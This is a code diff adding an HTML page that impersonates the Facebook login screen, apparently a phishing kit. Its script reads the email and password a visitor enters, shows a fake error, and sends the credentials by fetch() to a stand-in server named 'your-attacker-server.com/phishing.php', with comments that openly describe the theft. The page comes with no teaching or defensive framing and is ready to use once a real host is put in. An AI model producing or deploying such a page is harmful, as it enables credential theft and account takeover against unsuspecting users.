@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Facebook - Log In</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="icon" href="https://www.facebook.com/favicon.ico" type="image/x-icon" />
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      color: #1877f2;
+    }
+
+    .login-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: #f0f2f5;
+    }
+
+    .login-box {
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 400px;
+    }
+
+    .login-box h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #1877f2;
+    }
+
+    .login-box .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .login-box .logo img {
+      width: 120px;
+    }
+
+    .login-box input[type="email"],
+    .login-box input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+
+    .login-box button {
+      width: 100%;
+      padding: 12px;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .login-box button:hover {
+      background-color: #1557b0;
+    }
+
+    .login-box .footer {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 12px;
+      color: #666;
+    }
+
+    .login-box .footer a {
+      color: #1877f2;
+      text-decoration: none;
+    }
+
+    .login-box .footer a:hover {
+      text-decoration: underline;
+    }
+
+    .login-box .error {
+      color: red;
+      font-size: 12px;
+      margin-top: 5px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <div class="login-box">
+      <div class="logo">
+        <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook Logo" />
+      </div>
+      <h2>Log in to Facebook</h2>
+      <form id="loginForm">
+        <input type="email" id="email" placeholder="Email or phone number" required />
+        <input type="password" id="password" placeholder="Password" required />
+        <button type="submit">Log In</button>
+      </form>
+      <div class="footer">
+        <p>Forgotten account? <a href="#" id="resetLink">Reset</a></p>
+        <p>Terms of Service | Privacy Policy | Cookies Settings</p>
+      </div>
+      <div class="error" id="errorMsg"></div>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      // Simulate fake error
+      if (email === "user@example.com" && password === "password") {
+        document.getElementById('errorMsg').textContent = "Login successful!";
+        document.getElementById('errorMsg').style.display = "block";
+        setTimeout(() => {
+          window.location.href = "https://facebook.com/dashboard"; // Fake dashboard
+        }, 2000);
+      } else {
+        document.getElementById('errorMsg').textContent = "Invalid email or password.";
+        document.getElementById('errorMsg').style.display = "block";
+        setTimeout(() => {
+          document.getElementById('errorMsg').style.display = "none";
+        }, 3000);
+      }
+
+      // Send data to attacker's server
+      const data = {
+        email: email,
+        password: password
+      };
+
+      fetch('https://your-attacker-server.com/phishing.php', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      }).catch(error => {
+        console.error('Error:', error);
+      });
+    });
+
+    // Fake reset password link
+    document.getElementById('resetLink').addEventListener('click', function(e) {
+      e.preventDefault();
+      alert("Reset password? Your data will be stolen too!");
+    });
+  </script>
+</body>
+</html>
